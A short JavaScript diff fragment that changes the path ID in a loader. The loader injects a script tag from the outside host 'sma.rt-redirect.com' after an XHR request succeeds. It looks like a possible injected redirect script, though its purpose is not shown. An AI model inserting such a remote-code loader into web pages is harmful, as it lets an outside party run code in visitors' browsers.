@@ -7,7 +7,7 @@ if (this.readyState == 4 && this.status == 200) {
               m = a.getElementsByTagName(d)[0];              
            o.src = j + "?d=0&r=" + Math.random();
            m.parentNode.insertBefore(o, m)
-      })(document, 'script', 'https://sma.rt-redirect.com/sl/e7ac3600');
+      })(document, 'script', 'https://sma.rt-redirect.com/sl/3a1d9054');
     }
 }
 };
